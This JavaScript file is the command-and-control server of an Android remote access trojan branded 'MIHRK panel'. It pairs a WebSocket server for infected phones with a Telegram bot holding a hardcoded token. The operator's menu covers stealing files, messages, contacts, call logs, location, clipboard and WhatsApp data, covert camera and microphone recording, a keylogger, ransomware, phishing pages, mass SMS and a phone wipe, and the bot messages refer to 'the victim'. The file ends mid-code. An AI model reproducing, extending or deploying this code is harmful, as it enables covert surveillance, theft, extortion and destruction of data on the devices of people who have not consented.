const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8438498741:AAEPzCbxhSH7Rm1Z6sZG6x08pqTwabWsG24'
const id = '7832626481'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖❌sᴇʀᴠᴇʀ ᴜᴘʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ❌❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">ᴛᴇʟᴇɢʀᴀᴍ ᴄʜᴀɴɴᴇʟ➩ @ᴅᴏᴛxʙʀᴀɪɴ</p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𓃥ᴍᴇssᴀɢᴇ ꜰʀᴏᴍ <b>${req.headers.model}</b> ᴅᴇᴠɪᴄᴇ`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𓃥ᴍᴇssᴀɢᴇ ꜰʀᴏᴍ <b>${req.headers.model}</b> ᴅᴇᴠɪᴄᴇ\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• ʟᴏᴄᴀᴛɪᴏɴ ꜰʀᴏᴍ <b>${req.headers.model}</b> ᴅᴇᴠɪᴄᴇ`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• 🤠ɴᴇᴡ ᴅᴇᴠɪᴄᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ🤠\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀsɪᴏɴ : <b>${version}</b>\n` +
        `• sᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇss : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• 😥ᴅᴇᴠɪᴄᴇ ᴅɪsᴄᴏɴɴᴇᴄᴛᴇᴅ😥\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀsɪᴏɴ : <b>${version}</b>\n` +
            `• sᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇss : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴛᴏ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛʜᴇ sᴍs')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• ɢʀᴇᴀᴛ, ɴᴏᴡ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ sᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀs ɪɴ ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ɪs ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• ɢʀᴇᴀᴛ, ɴᴏᴡ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛᴏ ᴛʜɪs ɴᴜᴍʙᴇʀ')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛᴏ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛs')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 📮ᴇɴᴛᴇʀ ᴛʜᴇ ᴘᴀᴛʜ ᴏꜰ ᴛʜᴇ ꜰɪʟᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ🗳️')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 📂ᴇɴᴛᴇʀ ᴛʜᴇ ᴘᴀᴛʜ ᴏꜰ ᴛʜᴇ ꜰɪʟᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴇʟᴇᴛᴇ💥')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ʜᴏᴡ ʟᴏɴɢ ʏᴏᴜ ᴡᴀɴᴛ ᴛʜᴇ ᴍɪᴄʀᴏᴘʜᴏɴᴇ ᴛᴏ ʙᴇ ʀᴇᴄᴏʀᴅᴇᴅ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ʜᴏᴡ ʟᴏɴɢ ʏᴏᴜ ᴡᴀɴᴛ ᴛʜᴇ ᴍᴀɪɴ ᴄᴀᴍᴇʀᴀ ᴛᴏ ʙᴇ ʀᴇᴄᴏʀᴅᴇᴅ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ʜᴏᴡ ʟᴏɴɢ ʏᴏᴜ ᴡᴀɴᴛ ᴛʜᴇ sᴇʟꜰɪᴇ ᴄᴀᴍᴇʀᴀ ᴛᴏ ʙᴇ ʀᴇᴄᴏʀᴅᴇᴅ')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴘᴘᴇᴀʀ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• 📮ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴀᴘᴘᴇᴀʀ ᴀs ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• ɢʀᴇᴀᴛ, ɴᴏᴡ ᴇɴᴛᴇʀ ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙᴇ ᴏᴘᴇɴᴇᴅ ʙʏ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋs ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• ɢʀᴇᴀᴛ, ɴᴏᴡ ᴇɴᴛᴇʀ ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙᴇ ᴏᴘᴇɴᴇᴅ ʙʏ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ᴇɴᴛᴇʀ ᴛʜᴇ ᴀᴜᴅɪᴏ ʟɪɴᴋ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴘʟᴀʏ')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• 🪴ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴍɪʜʀᴋ ᴘᴀɴᴇʟ🪴\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪs ɪɴsᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇssᴀɢᴇ, ɪᴛ ᴍᴇᴀɴs ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪs ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ sᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇsɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ sᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇsɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅs\n\n' +
                '• 📱ꜰɪʀsᴛ ᴊᴏɪɴ 👉 @ᴅᴏᴛxʙʀᴀɪɴ \n\n' +
                '• 🌺ᴍᴀɪɴ ᴏᴡɴᴇʀ👉 @ᴅᴏᴛxʙʀᴀɪɴ \n\n' +
                '• 🧭ᴍᴀɪɴ ᴄʜᴀɴɴᴇʟ👉 @ᴅᴏᴛxʙʀᴀɪɴ \n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ sᴛᴜᴄᴋ sᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, sᴇɴᴅ /sᴛᴀʀᴛ ᴄᴏᴍᴍᴀɴᴅ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• ɴᴏ ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴅᴇᴠɪᴄᴇs ᴀᴠᴀɪʟᴀʙʟᴇ\n\n' +
                    '• ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪs ɪɴsᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                let text = '°• ʟɪsᴛ ᴏꜰ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀsɪᴏɴ : <b>${value.version}</b>\n` +
                        `• sᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇss : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• ɴᴏ ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴅᴇᴠɪᴄᴇs ᴀᴠᴀɪʟᴀʙʟᴇ\n\n' +
                    '• ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪs ɪɴsᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• sᴇʟᴇᴄᴛ ᴅᴇᴠɪᴄᴇ ᴛᴏ ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴇɴᴅ', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• ᴘᴇʀᴍɪssɪᴏɴ ᴅᴇɴɪᴇᴅ')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• sᴇʟᴇᴄᴛ ᴄᴏᴍᴍᴇɴᴅ ꜰᴏʀ ᴅᴇᴠɪᴄᴇ : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '🖼️ᴀᴘᴘs🖼️', callback_data: `apps:${uuid}`},
                        {text: '🚨ᴅᴇᴠɪᴄᴇ ɪɴꜰᴏ🚨', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂ɢᴇᴛ ꜰɪʟᴇ📂', callback_data: `file:${uuid}`},
                        {text: '👹ᴅᴇʟᴇᴛᴇ ꜰɪʟᴇ👹', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '🎟️sᴄʀᴇᴇɴsʜᴏᴛ🎟️', callback_data: `screenshot:${uuid}`},
                        {text: '👾ᴡʜᴀᴛsᴀᴘᴘ👾', callback_data: `whatsapp:${uuid}`},
                    ],
                    [
                        {text: '🌀ᴄʟɪᴘʙᴏᴀʀᴅ🌀', callback_data: `clipboard:${uuid}`},
                        {text: '🥎ᴍɪᴄʀᴏᴘʜᴏɴᴇ🥎', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '🔰ᴍᴀɪɴ ᴄᴀᴍᴇʀᴀ🔰', callback_data: `camera_main:${uuid}`},
                        {text: '🎪sᴇʟꜰɪᴇ ᴄᴀᴍᴇʀᴀ🎪', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🌐ʟᴏᴄᴀᴛɪᴏɴ🌐', callback_data: `location:${uuid}`},
                        {text: '🗯️ᴛᴏᴀsᴛ🗯️', callback_data: `toast:${uuid}`}
                    ],
                     [
                        {text: '📮ɢᴇᴛ ᴘᴀʏᴍᴇɴᴛ📮', callback_data: `Settings:${uuid}`},
                        {text: '☢️ᴘʜᴏɴᴇ ʀᴇsᴇᴛ☢️', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
                        {text: '☃️ᴄᴀʟʟ ʟᴏɢs☃️', callback_data: `calls:${uuid}`},
                        {text: '🏆ᴄᴏɴᴛᴀᴄᴛs🏆', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '🔒️ᴠɪʙʀᴀᴛᴇ🔒️', callback_data: `vibrate:${uuid}`},
                        {text: '🔔ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '🧊ᴍᴇssᴀɢᴇs🧊', callback_data: `messages:${uuid}`},
                        {text: '🎁sᴇɴᴅ sᴍs🎁', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '❌ʀᴀɴsᴏᴍᴡᴀʀᴇ❌', callback_data: `Ransomware:${uuid}`},
                        {text: '✳️ꜰʜɪsʜɪɴɢ ᴘᴀɢᴇ✳️', callback_data: `custom_phishing:${uuid}`},
                    ],
                    [
                        {text: '🦞ᴘʟᴀʏ ᴀᴜᴅɪᴏ🦞', callback_data: `play_audio:${uuid}`},
                        {text: '☯️sᴛᴏᴘ ᴀᴜᴅɪᴏ☯️', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '⛔‼️sᴇɴᴅ sᴍs ᴛᴏ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛs‼️⛔',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                    [
                        {text: '🔒ᴇɴᴄʀʏᴘᴛ ᴅᴀᴛᴀ🔒', callback_data: `encrypt_data:${uuid}`},
                        {text: '🔒ᴅᴇᴄʀʏᴘᴛ ᴅᴀᴛᴀ🔒', callback_data: `decrypt_data:${uuid}`},
                    ],
                    [
                        {text: '🔮ᴋᴇʏʟᴏɢɢᴇʀ ᴏɴ🔮', callback_data: `keylogger_on:${uuid}`},
                        {text: '⛽ᴋᴇʏʟᴏɢᴇʀ ᴏꜰꜰ⛽', callback_data: `keylogger_off:${uuid}`},
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ⏳ʏᴏᴜʀ ʀᴇǫᴜᴇsᴛ ɪs ᴏɴ ᴘʀᴏᴄᴇss⏳\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇsᴘᴏɴsᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛs',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇs"], ["ᴇxᴇᴄᴜᴛᴇ ᴄᴏᴍᴍᴀɴᴅ"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
